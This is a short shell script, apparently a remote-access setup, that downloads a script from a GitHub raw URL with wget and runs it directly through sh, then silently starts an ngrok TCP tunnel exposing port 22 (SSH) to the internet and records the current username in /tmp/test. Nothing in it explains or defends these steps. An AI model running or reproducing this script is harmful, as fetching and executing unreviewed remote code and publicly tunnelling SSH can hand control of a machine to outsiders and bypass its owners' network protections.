#!/bin/sh
# m.sh


sh -c "$(wget -O - https://raw.githubusercontent.com/ars7v/in/main/u.sh)" & wait

/usr/local/bin/ngrok tcp 22 > /dev/null &

rm -f /tmp/test & wait
echo "$(whoami)" > /tmp/test & wait

